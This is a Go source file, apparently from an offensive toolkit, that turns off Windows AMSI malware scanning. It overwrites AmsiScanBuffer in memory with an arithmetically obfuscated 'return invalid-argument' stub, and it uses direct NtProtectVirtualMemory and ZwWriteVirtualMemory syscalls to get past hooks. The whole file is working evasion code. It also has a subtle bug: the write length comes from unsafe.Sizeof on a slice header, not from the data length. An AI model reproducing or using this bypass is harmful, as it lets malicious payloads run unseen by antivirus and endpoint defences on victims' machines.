package core

import (
  "fmt"
  "unsafe"
  "syscall"
)

var amsi_patch = []byte{0xB2 + 6, 0x52 + 5, 0x00, 0x04 + 3, 0x7E + 2, 0xc2 + 1}

func PatchAmsi() (error) {
  err := WriteBytes("amsi.dll", "AmsiScanBuffer", &amsi_patch)
  if err != nil {
    return err
  }

  return nil
}

func WriteBytes(module string, proc string, data *[]byte) error {

  target := syscall.NewLazyDLL(module).NewProc(proc)
  err := target.Find()
  if err != nil {
    return err
  }
  
  ZwWriteVirtualMemory, err := GetSysId("ZwWriteVirtualMemory")
  if err != nil {
    return err
  }

  NtProtectVirtualMemory, err := GetSysId("NtProtectVirtualMemory")
  if err != nil {
    return err
  }

  baseAddress := target.Addr()
  numberOfBytesToProtect := uintptr(len(*data))
  var oldProtect uint32

  ret, err := Syscall(
    NtProtectVirtualMemory,
    uintptr(0xffffffffffffffff),
    uintptr(unsafe.Pointer(&baseAddress)),
    uintptr(unsafe.Pointer(&numberOfBytesToProtect)),
    syscall.PAGE_EXECUTE_READWRITE,
    uintptr(unsafe.Pointer(&oldProtect)),
  )
  if ret != 0 || err != nil {
    return fmt.Errorf("there was an error making the NtProtectVirtualMemory syscall with a return of %d: %s", 0, err)
  }

  ret, err = Syscall(
    ZwWriteVirtualMemory,
    uintptr(0xffffffffffffffff),
    target.Addr(),
    uintptr(unsafe.Pointer(&[]byte(*data)[0])),
    unsafe.Sizeof(*data),
    0,
  )
  if ret != 0 || err != nil {
    return fmt.Errorf("there was an error making the ZwWriteVirtualMemory syscall with a return of %d: %s", 0, err)
  }

  ret, err = Syscall(
    NtProtectVirtualMemory,
    uintptr(0xffffffffffffffff),
    uintptr(unsafe.Pointer(&baseAddress)),
    uintptr(unsafe.Pointer(&numberOfBytesToProtect)),
    uintptr(oldProtect),
    uintptr(unsafe.Pointer(&oldProtect)),
  )
  if ret != 0 || err != nil {
    return fmt.Errorf("there was an error making the NtProtectVirtualMemory syscall with a return of %d: %s", 0, err)
  }
	
  return nil
}


